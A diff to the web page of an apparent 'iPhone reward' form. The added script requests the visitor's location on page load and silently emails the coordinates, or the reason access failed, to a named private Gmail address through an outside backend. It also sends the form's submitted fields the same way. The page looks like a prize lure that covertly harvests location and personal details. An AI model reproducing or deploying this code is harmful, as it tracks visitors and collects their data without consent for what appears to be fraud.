@@ -92,26 +92,44 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
-    <!-- JavaScript for Form Submission and Geolocation -->
+    <!-- JavaScript for Geolocation and Form Submission -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
 
+            // Request location on page load
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                        // Send geolocation email
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
-                        locationDisplay.textContent = "Could not retrieve location.";
+                        let errorMessage = "An unknown error occurred.";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location access denied by user.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "Location request timed out.";
+                                break;
+                        }
+                        locationDisplay.textContent = errorMessage;
+                        sendEmail("Location Access Error", errorMessage, "khalilrodeni@gmail.com");
                     }
                 );
             } else {
                 locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
 
+            // Form submission handler
             document.getElementById("rewardForm").addEventListener("submit", function (e) {
                 e.preventDefault();
 
@@ -126,32 +144,41 @@
                 };
 
                 // Send form data
-                fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        subject: "New iPhone Reward Form Submission",
-                        message: JSON.stringify(formData, null, 2),
-                        recipient_email: "khalilrodeni@gmail.com",
-                        recipient_name: "Khalil Ahmed"
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.message) {
-                        alert("Form submitted successfully!");
-                    } else {
-                        alert("Error: " + (data.error || "Unknown error"));
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("Error submitting form.");
-                });
+                sendEmail("Form Submission", JSON.stringify(formData, null, 2), "khalilrodeni@gmail.com");
             });
         });
+
+        // Send email function
+        function sendEmail(subject, message, recipientEmail) {
+            const emailData = {
+                subject: subject,
+                message: message,
+                recipient_email: recipientEmail,
+                recipient_name: "Khalil Ahmed"
+            };
+
+            fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(emailData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message) {
+                    alert("Email sent successfully!");
+                } else if (data.error) {
+                    alert("Error: " + data.error);
+                } else {
+                    alert("Unexpected error occurred.");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending email:", error);
+                alert("Error sending email: " + error.message);
+            });
+        }
     </script>
 </body>
 </html>
